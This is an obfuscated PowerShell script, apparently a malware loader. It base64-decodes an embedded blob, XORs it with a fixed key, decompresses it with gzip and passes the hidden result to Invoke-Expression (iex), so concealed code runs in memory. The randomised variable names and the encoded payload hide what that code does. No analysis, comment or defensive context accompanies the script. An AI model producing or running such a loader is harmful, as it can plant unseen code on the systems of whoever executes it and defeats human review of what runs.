$n523dirkycg0jtv = [System.Text.Encoding]::ascii
function 9jnyt3461dwx70pcqeskugz8lav  {param($9jvrqmla1di8peu )
  $sjwftl1zp0yg39k = [System.Convert]::FromBase64String($9jvrqmla1di8peu)
  $fwcbq0dp5kgmjiy= $n523dirkycg0jtv.GetBytes("azkvhu5lrwoq")
    $oz0c2x3ash81wpd = $sjwftl1zp0yg39k
    $ex492nr7q0ywg3k = $(for ($tpuy0srhadme5jb = 0; $tpuy0srhadme5jb -lt $oz0c2x3ash81wpd.length; ) {
        for ($ok09feirya4ndct = 0; $ok09feirya4ndct -lt $fwcbq0dp5kgmjiy.length; $ok09feirya4ndct++) {
            $oz0c2x3ash81wpd[$tpuy0srhadme5jb] -bxor $fwcbq0dp5kgmjiy[$ok09feirya4ndct]
            $tpuy0srhadme5jb++
            if ($tpuy0srhadme5jb -ge $oz0c2x3ash81wpd.Length) {
                $ok09feirya4ndct = $fwcbq0dp5kgmjiy.length
            }
        }
    })
	$r0m6wxi32t7bhpe = New-Object System.IO.MemoryStream( , $ex492nr7q0ywg3k )

	    $v7e2kyjrpzifa98 = New-Object System.IO.MemoryStream
        $5sfu79e23p8g1al = New-Object System.IO.Compression.GzipStream $r0m6wxi32t7bhpe, ([IO.Compression.CompressionMode]::Decompress)
	    $5sfu79e23p8g1al.CopyTo( $v7e2kyjrpzifa98 )
        $5sfu79e23p8g1al.Close()
		$r0m6wxi32t7bhpe.Close()
		[byte[]] $o0lckid57mwz84u = $v7e2kyjrpzifa98.ToArray()
 $xkio1yv6c07eg2l=$o0lckid57mwz84u
    return $xkio1yv6c07eg2l
}
[byte[]]$sn13q96jkwd4hob=9jnyt3461dwx70pcqeskugz8lav $0i157d2foha94cj
[System.Text.Encoding]::ascii.GetString((9jnyt3461dwx70pcqeskugz8lav "fvFjdmh1NWx2d+IkDAnIQHiLaQqKeHX8Wruet4itojLgvmiqJmjcB/JieoMoKIk3Z2MP9ax8VCAgiJhfTjSXBHd3Buwk3AjuHAxOAiXyTvoAIF6wMJjar/zQa+ai/MFQ2RhJPwxBpxVEJA6KWMwYyRvPzexoZjrwkeD+IUtUS3aKczLRqBn1XnIsVtYg4awsgEuFSfXopKgXu9XTy+VA7HBNUbK+eMntgxwq1ygUBgimz6fVXmoNv09aOvrKLvzYI5c5Dye9ckmzFQONZ/hE3zyVREU3o0h4XJO9WJOd+FazgukSIkawmJnfdv6SJFT63I0MCmgoNl7rjW6YYyqo7mF8J8RKuoI1Z77gnq+MIQqeBBsRVDketq5/HJsnB+HrCTHZfD1Z2b9rEl1WPJTS3C6ogvraAlousIzWLMVoyfObRbaWmv6nn2L9WaxVjM8+GvoQnTPY6JXALmFFkJPKUF8QI2v+XLl2w5ZOydMTyFreSLgUlsTxwcKM68KuW8aKAIFC3yJQSmmnwtrP2iXsSjlRORmf0vWp31FzKwM999Gr8u692Bp3b+7I37TkcqCiRxBKdbHeW9dqCIMcp12Ojh9tyuvy35ZxaVgpkCjRac2ERm2KzpIOlG4xC1nM2PTZNdta/eF/5WkcJ9FNQguHZy3LYJ3D2Sp67juWPc8qfxNFE/taL1gRB/xwFz012kz6z5L62CFvvElHbkf5K8LaRdKOw/dnUIIDCLJ/skHEA30orxUXUFTNRWF++G5jnaaq/GXMUZsw0xlxRsKqoGDgLBfVy2RLtc7R4XZZmeJpRX1yVJwec9yfdmvsrhbQFQBmO+3hzTboKxBhuFy2GDb6P/rxc79CMNef6Zs0BmwwhMg7dSrFTyMj5RpzqoeoEwCHPmyktmlv8jVbPjNEd+Xy0sZnB1tY7XAhzH4FdGivo8IAX+L0rc/apNUGaQT/tojcb8KBboI2NtOPe59u4lt0wwUOQYMOyYUGTlUQNZNTRsPcihDPb5R2gQbLLZkOjKkI2c3seaGiXlOJpPZK1jS0aJ1HghepaDGQ1ok3oQrkZPV2Q2NgxuNScjICZ6gCXYjqaxo3huhiBwPzbq2/Sxx5/tKBL2aJLXMtPeElrqLRjRgfv/gTILdEZ3OgCvowqzsgOPgxRmbUdYR5lPKSjrqqc7WevW87/u1zl970MGgO9sztCXnbuwqOkAygu1DdO5BySuQuPTdyNWw="))|iex;